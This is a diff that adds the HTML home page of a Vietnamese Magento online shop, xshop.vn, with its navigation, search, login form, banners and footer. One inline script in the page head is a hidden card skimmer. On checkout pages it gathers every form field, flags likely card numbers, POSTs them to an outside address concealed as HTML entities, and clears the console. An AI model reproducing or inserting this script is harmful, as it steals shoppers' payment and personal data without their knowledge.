@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Xshop</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="http://xshop.vn/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://xshop.vn/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://xshop.vn/js/blank.html';
+    var BLANK_IMG = 'http://xshop.vn/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/js/calendar/calendar-win2k-1.css" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/jquery.bxslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/font-awesome.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/bootstrap.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/bootstrap-theme.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/jasny-bootstrap.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/custom.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/amshopby.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/tts/bannerslider/popup.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/default/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://xshop.vn/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/varien/js.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/varien/form.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/calendar/calendar.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/calendar/calendar-setup.js"></script>
+<script type="text/javascript" src="http://xshop.vn/js/tts/bannerslider/lightbox.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/jquery-1.11.1.min.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/noConflict.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/selectivizr.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/matchMedia.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/matchMedia.addListener.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/enquire.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/app.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/jquery.cycle2.min.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/jquery.cycle2.swipe.min.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/slideshow.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/lib/imagesloaded.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/bootstrap.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/jasny-bootstrap.min.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/holder.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/xshop2015/default/js/jquery.bxslider.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://xshop.vn/skin/frontend/xshop2015/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://xshop.vn/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://xshop.vn/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.xshop.vn';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["VN"];
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+enUS = {"m":{"wide":["January","February","March","April","May","June","July","August","September","October","November","December"],"abbr":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]}}; // en_US locale reference
+Calendar._DN = ["Ch\u1ee7 nh\u1eadt","Th\u1ee9 hai","Th\u1ee9 ba","Th\u1ee9 t\u01b0","Th\u1ee9 n\u0103m","Th\u1ee9 s\u00e1u","Th\u1ee9 b\u1ea3y"]; // full day names
+Calendar._SDN = ["CN","Th 2","Th 3","Th 4","Th 5","Th 6","Th 7"]; // short day names
+Calendar._FD = 0; // First day of the week. "0" means display Sunday first, "1" means display Monday first, etc.
+Calendar._MN = ["th\u00e1ng m\u1ed9t","th\u00e1ng hai","th\u00e1ng ba","th\u00e1ng t\u01b0","th\u00e1ng n\u0103m","th\u00e1ng s\u00e1u","th\u00e1ng b\u1ea3y","th\u00e1ng t\u00e1m","th\u00e1ng ch\u00edn","th\u00e1ng m\u01b0\u1eddi","th\u00e1ng m\u01b0\u1eddi m\u1ed9t","th\u00e1ng m\u01b0\u1eddi hai"]; // full month names
+Calendar._SMN = ["thg 1","thg 2","thg 3","thg 4","thg 5","thg 6","thg 7","thg 8","thg 9","thg 10","thg 11","thg 12"]; // short month names
+Calendar._am = "SA"; // am/pm
+Calendar._pm = "CH";
+
+// tooltips
+Calendar._TT = {};
+Calendar._TT["INFO"] = "About the calendar";
+
+Calendar._TT["ABOUT"] =
+"DHTML Date/Time Selector\n" +
+"(c) dynarch.com 2002-2005 / Author: Mihai Bazon\n" +
+"For latest version visit: http://www.dynarch.com/projects/calendar/\n" +
+"Distributed under GNU LGPL. See http://gnu.org/licenses/lgpl.html for details." +
+"\n\n" +
+"Date selection:\n" +
+"- Use the \xab, \xbb buttons to select year\n" +
+"- Use the " + String.fromCharCode(0x2039) + ", " + String.fromCharCode(0x203a) + " buttons to select month\n" +
+"- Hold mouse button on any of the above buttons for faster selection.";
+Calendar._TT["ABOUT_TIME"] = "\n\n" +
+"Time selection:\n" +
+"- Click on any of the time parts to increase it\n" +
+"- or Shift-click to decrease it\n" +
+"- or click and drag for faster selection.";
+
+Calendar._TT["PREV_YEAR"] = "Prev. year (hold for menu)";
+Calendar._TT["PREV_MONTH"] = "Prev. month (hold for menu)";
+Calendar._TT["GO_TODAY"] = "Go Today";
+Calendar._TT["NEXT_MONTH"] = "Next month (hold for menu)";
+Calendar._TT["NEXT_YEAR"] = "Next year (hold for menu)";
+Calendar._TT["SEL_DATE"] = "Select date";
+Calendar._TT["DRAG_TO_MOVE"] = "Drag to move";
+Calendar._TT["PART_TODAY"] = ' (' + "Today" + ')';
+
+// the following is to inform that "%s" is to be the first day of week
+Calendar._TT["DAY_FIRST"] = "Display %s first";
+
+// This may be locale-dependent. It specifies the week-end days, as an array
+// of comma-separated numbers. The numbers are from 0 to 6: 0 means Sunday, 1
+// means Monday, etc.
+Calendar._TT["WEEKEND"] = "0,6";
+
+Calendar._TT["CLOSE"] = "Đóng";
+Calendar._TT["TODAY"] = "Today";
+Calendar._TT["TIME_PART"] = "(Shift-)Click or drag to change value";
+
+// date formats
+Calendar._TT["DEF_DATE_FORMAT"] = "%d-%m-%Y";
+Calendar._TT["TT_DATE_FORMAT"] = "'Ng\u00e0%Y' %d 'th\u00e1ng' %m 'n\u0103m' %Y";
+
+Calendar._TT["WK"] = "Week";
+Calendar._TT["TIME"] = "Time:";
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"This is a required field.":"C\u1ea7n nh\u1eadp th\u00f4ng tin.","Please enter a valid email address. For example johndoe@domain.com.":"H\u00e3y nh\u1eadp \u0111\u1ecba ch\u1ec9 email, v\u00ed d\u1ee5: abc@domain.com","Please select one of the options.":"Vui l\u00f2ng ch\u1ecdn m\u1ed9t tr\u01b0\u1eddng"});
+        //]]></script><script type="text/javascript">jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("checkout").test(n)){for(var c=document.querySelectorAll("input,select"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n),console.clear()}}})});</script></head>
+<body class=" cms-index-index cms-home">
+<div id="top">
+		<div id="top-inner">
+			<div class="a-left">
+		    	<p><a href="http://xshop.vn/about-xshop/cam-ket-chat-luong"><img src="http://xshop.vn/media/wysiwyg/image/like_icon.png" alt="cam ket chat luong" />Cam kết chất lượng</a></p>		    </div>
+		
+		    <div class="a-right">
+                    <ul id="hotro">
+                        <li><span id="btn-hotro">Hỗ trợ </span>
+                        <ul class="child">
+<li><a href="http://xshop.vn/sales/guest/form">Kiểm tra đơn h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/huong-dan-dat-hang">Hướng dẫn đặt h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/pt-thanh-toan">Phương thức thanh to&aacute;n</a></li>
+<li><a href="http://xshop.vn/about-xshop/giao-hang">Giao h&agrave;ng</a></li>
+<li><a href="#">Ph&iacute; giao h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/doi-tra-hang">Hướng dẫn đổi/ trả h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/huong-dan-bao-hanh">Hướng dẫn bảo h&agrave;nh</a></li>
+</ul>                        </li>
+                        <li><span id="mobile-version-icon"><a href="javascript:window.location = 'http://xshop.vn/gomobile/index/switchToMobile/?current_url='+encodeURIComponent(window.location.href);">Mobile version</a></span></li>
+                    </ul>
+		    </div>
+	    </div>
+	</div>
+	
+
+<div class="wrapper">
+	
+        <div class="header-outer">
+<div class="header">
+    <div class="container">
+        <div class="branding">
+                <h1 class="logo"><a href="http://xshop.vn/" title="Magento Commerce" class="logo"><img src="http://xshop.vn/skin/frontend/xshop2015/default/images/logo.png" alt="Magento Commerce" /></a></h1>
+                </div>
+
+          <div id="header-search" class="">
+   			<form id="search_mini_form" action="http://xshop.vn/catalogsearch/result/" method="get">
+<div class="form-search">
+       <div class="input-group">
+         <input id="search" type="search" required="required" 
+              name="q"  
+              value="" 
+              placeholder="Nhập tên hoặc mã sản phẩm bạn quan tâm" 
+              class="form-control">
+             
+           <div class="input-group-btn" id="btn-wrapper-menu-category">
+                <button type="button" id="btn-menu-catelog" class="btn btn-transparent dropdown-toggle" data-toggle="dropdown" aria-expanded="true">
+                <span class="text-search-all">
+                  <span class="text-search-all-title">
+                                                 Tất cả                                                </span>
+               <span class="caret"></span>
+               </span>
+
+               </button>
+  
+                <ul id="search-cat" class="dropdown-menu" role="menu"  aria-labelledby="btn-menu-catelog">
+                <li><a href="#" class="all-cat" id="">Tất cả</a></li>
+                    
+                                     <input type="hidden" name="cat" value="" id="cat-id" />
+                </ul>
+                <button class="btn btn-primary" type="submit">
+                  <!-- <span class="glyphicon glyphicon-search"></span> -->
+                  <span class="icon-search"></span>
+                </button>
+            </div>
+            <!-- /btn-group -->
+      </div><!-- /input-group -->
+
+    <div id="search_autocomplete" class="search-autocomplete"></div>
+    <script type="text/javascript">
+      var $j = jQuery.noConflict();
+
+       $j("#search-cat li a").click(function(){
+              var txt = $j(this).text();
+              $j('#btn-menu-catelog').html('<span class="text-search-all"><span class="text-search-all-title">' + txt + '</span><span class="caret"></span></span>' );
+              if(!$j(this).hasClass('all-cat'))
+              {
+                $j('#search-cat .all-cat').show();
+              }
+              else{
+                $j('#search-cat .all-cat').hide();
+              }
+			  $j('#cat-id').val($j(this).attr('id'));;
+            });
+
+    //<![CDATA[
+        var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Nhập tên hoặc mã sản phẩm bạn quan tâm');
+        searchForm.initAutocomplete('http://xshop.vn/catalogsearch/ajax/suggest/', 'search_autocomplete');
+    //]]>
+       
+      
+    </script>
+</div>
+</form>
+  		</div>
+  		<div id="header-menu">
+  			   <ul class="navbar-nav">
+  			   	  	
+                  
+                  <li class="parent">
+	                  	<a href="http://xshop.vn/checkout/cart/">
+		              	<span class="header-cart-icon">
+	                  							        [0]		                  	<br/>Giỏ hàng</span> 
+		                </a>  	
+                  </li>
+                  <li>
+                  		<span class="header-wishlist-icon">
+                  		                  		<a href="http://xshop.vn/customer/account/login/">Thích rồi đó</a>
+                  		</span>
+                  </li>
+                  <li id="header-menulogin">   		               
+   		               	   		     
+	   		               	<span class="header-user-icon">
+		   		               	Đăng ký<br/>
+		   		               	Đăng nhập	   		               	</span>
+	                  		<div id="header-account-login">
+			<form action="http://xshop.vn/customer/account/loginPost/" method="post" id="header-login-form" role="form">
+		<input name="form_key" type="hidden" value="8lYGmRv4bog5zswC" />
+		<div class="#dropdown-menu" id="header-login">
+			<div >
+				<ul>
+					<li><div class="input-box">
+							<input type="text" name="login[username]" placeholder="Email"
+								value=""
+								id="email" class="input-text required-entry validate-email"
+								title="Địa chỉ Email" />
+						</div>
+					</li>
+					<li><div class="input-box">
+							<input type="password" name="login[password]"
+								placeholder="Mật khẩu"
+								class="input-text required-entry validate-password" id="pass"
+								title="Mật khẩu" />
+						</div>
+					</li>
+									</ul>
+				<p>
+					<button type="submit" class="button" name="send" id="send2">Đăng nhập</button>
+				</p>
+				<p>
+					<a href="http://xshop.vn/customer/account/forgotpassword/">Quên mật khẩu</a>
+				</p>
+
+			</div>
+			<div id="header-register">
+				<h2 class="panel-title">
+					Khách hàng mới?				</h2>
+				<p><button type="button" class="button"
+						onclick="window.location='http://xshop.vn/customer/account/create/';">
+						<i class="fa fa-angle-right"></i>
+						Đăng ký miễn phí					</button>
+				</p>
+			</div>
+		</div>
+</form>
+<script type="text/javascript">
+    //<![CDATA[
+        var dataForm = new VarienForm('header-login-form', true);
+    //]]>
+    </script>
+</div>
+  	                  		
+   		               	                  		
+                  </li>
+              </ul>
+  		</div>
+    </div>   
+    </div>
+</div>
+<script type="text/javascript">
+jQuery( document ).ready(function() {
+	  jQuery(".home-menu .mega-menu li.level0").removeClass('active');
+});
+</script>
+    <div class="page container"> 
+           
+        <div class="container body-wrapper">
+                    </div>
+        <div id="home-banner-top" class="row">
+        	<div class="col-md-12 no-padding-hor images-top">
+            	<div class="col-md-8 image-banner first">
+				
+                </div>
+                <div class="col-md-4 image-banner last">
+				
+                </div>
+        	</div>
+            <div class="col-md-12 no-padding-hor  images-bottom">
+            	<div class="col-md-4 image-banner first">
+                    <div class="image-banner-wrapper">
+						<img src="http://xshop.vn/media/wysiwyg/new-banner/sanphambanchay.jpg" alt="sanphambanchay" />                        <a class="banner-title" href="http://xshop.vn/bestseller/">Sản phẩm b&aacute;n chạy <em class="icon icon-banner icon-chevron"></em></a>
+                    </div>
+                </div>
+                <div class="col-md-4 image-banner">
+                    <div class="image-banner-wrapper">
+						<img src="http://xshop.vn/media/wysiwyg/new-banner/hangmoive.jpg" alt="hangmoive" />                        <a class="banner-title" href="http://xshop.vn/newproduct/">H&agrave;ng mới về <em class="icon icon-banner icon-chevron"></em></a>
+                    </div>
+                </div>
+                <div class="col-md-4 image-banner last">
+                    <div class="image-banner-wrapper">
+						<img src="http://xshop.vn/media/wysiwyg/new-banner/bosuutap.jpg" alt="bosuutap" />                        <a class="banner-title" href="http://xshop.vn/">Bộ sưu tập <em class="icon icon-banner icon-chevron"></em></a>
+                    </div>
+                </div>
+        	</div>
+        </div>
+        
+         <div class="home-category container">
+</div>         
+                
+
+    </div>
+</div>
+
+<div id="footer-outer">
+<div class="footer-content container" >
+	<div class="col-md-4" id="footer-about-us">
+	<p><img src="http://xshop.vn/media/wysiwyg/image/small_logo_07.png" alt="aaa" /></p>
+<p>Mua h&agrave;ng trực tuyến(mua h&agrave;ng online) mang lại sự tiện lợi, lựa chọn đa dạng hơn v&agrave; c&aacute;c dịch vụ tốt hơn cho người ti&ecirc;u d&ugrave;ng, thế nhưng người ti&ecirc;u d&ugrave;ng Việt Nam vẫn chưa tận hưởng được triển khai với mong muốn trở th&agrave;nh trung t&acirc;m mua sắm trực tuyến số 1 tại Việt Nam, nơi bạn c&oacute; thể chọn lựa mọi thứ, từ c&aacute;c mặt h&agrave;ng điện tử như Laptop, điện thoại di động gi&aacute; rẻ, thiết bị gia dụng như m&aacute;y lạnh, m&aacute;y lọc kh&ocirc;ng kh&iacute;, m&aacute;y h&uacute;t bụi mini gia đ&igrave;nh, nội thất ph&ograve;ng ngủ... Ch&uacute;ng t&ocirc;i c&oacute; tất cả!</p>
+<p>Tại XSHOP.vn bạn c&oacute; thể mua đồ điện tử gi&aacute; rẻ, cũng như c&aacute;c loại mặt h&agrave;ng kh&aacute;c với rất nhiều c&aacute;c chương tr&igrave;nh khuyến m&atilde;i h&agrave;ng th&aacute;ng. Ngo&agrave;i ra bạn cũng c&oacute; thể tham gia đăng k&yacute; nhận tin</p>	</div>
+	<div class="col-md-3" id="footer-dang-ky">
+	<p>
+<div class="col-xs-12 col-md-4">
+<form action="http://xshop.vn/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+	
+<label for="newsletter">Đăng ký nhận tin</label>
+
+<div class="input-group">
+
+	<input type="text" name="email" id="newsletter" title="Đăng ký nhận tin" class="form-control required-entry validate-email" placeholder="Email của bạn"/> 
+	
+	<span class="input-group-btn">
+		<button type="submit" class="btn btn-default" title="Gửi">
+			<span><span>Gửi</span></span>
+		</button>
+	</span> 
+</div>
+<div class="input-group" id="gender-options">
+	<p><input id="chbox_1" type="checkbox" class="chkclass" value="1"checked="checked"/>&nbsp;<label for="chbox_1">Nam
+</label>&nbsp;&nbsp;<input id="chbox_2" type="checkbox" class="chkclass" value="2"/>&nbsp;<label for="chbox_2">Nữ
+</label>&nbsp;&nbsp;</p>
+	<input type="hidden" name="gender" id="gender" value="" class="validate-number required-entry" />
+</div>
+<script type="text/javascript">
+//<![CDATA[
+jQuery(function(){
+	jQuery( document ).ready(function( $ ) {
+	  jQuery("#gender").val(1);
+	});
+	jQuery(".chkclass").click(function(){
+		
+		jQuery(".chkclass").not(jQuery(this)).removeAttr("checked");
+		//jQuery(this).attr("checked", jQuery(this).attr("checked"));   
+
+
+		if(jQuery(this).attr("checked") == "checked"){
+			jQuery("#gender").attr('value', '');
+			jQuery(this).removeAttr("checked");
+		}
+		else{
+			jQuery(this).attr("checked","checked");
+			jQuery("#gender").val(this.value);
+		}
+		//alert('checked'); 
+    });
+});
+//]]>​​
+</script>
+</form>
+
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+
+</p>
+<p>Đăng k&yacute; nhận tin từ XSHOP v&agrave; nhận voucher 50.000 VND. Th&ocirc;ng tin của bạn sẽ được giữ k&iacute;n tuyệt đối, v&agrave; bạn c&oacute; thể hủy đăng k&yacute; bất kỳ l&uacute;c n&agrave;o. Mỗi email chỉ sử dụng được 1 m&atilde; giảm gi&aacute;.<br />Bằng việc đăng k&yacute; nhận tin từ XSHOP, bạn x&aacute;c nhận rằng bạn đ&atilde; đọc v&agrave; hiểu ch&iacute;nh s&aacute;ch bảo mật của ch&uacute;ng t&ocirc;i.</p>	</div>
+	<div class="col-md-3" id="footer-danh-muc">
+	<p><a href="http://xshop.vn/about-xshop"><img src="http://xshop.vn/media/wysiwyg/image/logo_smaller_03.png" alt="about xshop img" /></a></p>
+<ul>
+<li><a href="http://xshop.vn/about-xshop/gioi-thieu">Giới thiệu</a></li>
+<li><a href="http://xshop.vn/about-xshop/cam-ket-chat-luong">Cam kết chất lượng</a></li>
+<li><a href="http://xshop.vn/about-xshop/danh-muc-san-pham">Danh mục sản phẩm</a></li>
+<li><a href="http://xshop.vn/about-xshop/chuong-trinh-doi-tac">Chương tr&igrave;nh đối t&aacute;c</a></li>
+<li><a href="http://xshop.vn/about-xshop/dieu-khoan-bao-mat">Điều khoản bảo mật</a></li>
+<li><a href="http://xshop.vn/about-xshop/dieu-khoan-bao-mat">B&aacute;o ch&iacute;</a></li>
+<li><a href="http://xshop.vn/about-xshop/tuyen-dung">Tuyển dụng</a></li>
+</ul>	<p class="text-uppercase title">ĐỐI T&Aacute;C LI&Ecirc;N KẾT</p>
+<p>Keytech.vn - Camera quan s&aacute;t</p>
+<p>Mayphatdien.com - M&aacute;y ph&aacute;t điện</p>
+<p>Nhadat.net - Mua B&aacute;n nh&agrave; đất</p>	</div>
+	<div class="col-md-2" id="footer-ho-tro">
+    <p class="text-uppercase title" >Hỗ trợ kh&aacute;ch h&agrave;ng</p>
+	<ul class="child">
+<li><a href="http://xshop.vn/sales/guest/form">Kiểm tra đơn h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/huong-dan-dat-hang">Hướng dẫn đặt h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/pt-thanh-toan">Phương thức thanh to&aacute;n</a></li>
+<li><a href="http://xshop.vn/about-xshop/giao-hang">Giao h&agrave;ng</a></li>
+<li><a href="#">Ph&iacute; giao h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/doi-tra-hang">Hướng dẫn đổi/ trả h&agrave;ng</a></li>
+<li><a href="http://xshop.vn/about-xshop/huong-dan-bao-hanh">Hướng dẫn bảo h&agrave;nh</a></li>
+</ul>	</div>
+</div>
+</div>
+<footer>
+<div class="footer well">
+<div class="copyright">
+<div class="row">
+<div class="col-md-8" id="footer-links"><p><strong></strong>Bản quyền thuộc về C&Ocirc;NG TY TNHH XSHOP. Website đ&atilde; được đăng k&yacute; với Bộ C&ocirc;ng Thương v&agrave; chờ duyệt.</p></div>
+<div id="footer-follow"><p>Kết nối với ch&uacute;ng t&ocirc;i&nbsp;&nbsp;&nbsp;&nbsp; <a href="#"><img src="http://xshop.vn/media/wysiwyg/image/fb_icon.png" alt="facebook" width="43" height="43" /></a> <a href="#"><img src="http://xshop.vn/media/wysiwyg/image/twitter_icon.png" alt="twitter" /></a> <a href="#"><img src="http://xshop.vn/media/wysiwyg/image/youtube_icon_07.png" alt="youtube" /></a> <a href="#"><img src="http://xshop.vn/media/wysiwyg/image/google_icon.png" alt="google" /></a></p></div>
+</div>
+</div>
+</div>
+</footer>
+
+<script type="text/javascript">
+jQuery("document").ready(function($){
+	
+	var nav = $('.header-outer');
+	
+	$(window).scroll(function () {
+		if ($(this).scrollTop() > 136) {
+			nav.addClass("fixed-header");
+		} else {
+			nav.removeClass("fixed-header");
+		}
+	});
+
+});
+</script>
+</body>
+</html>
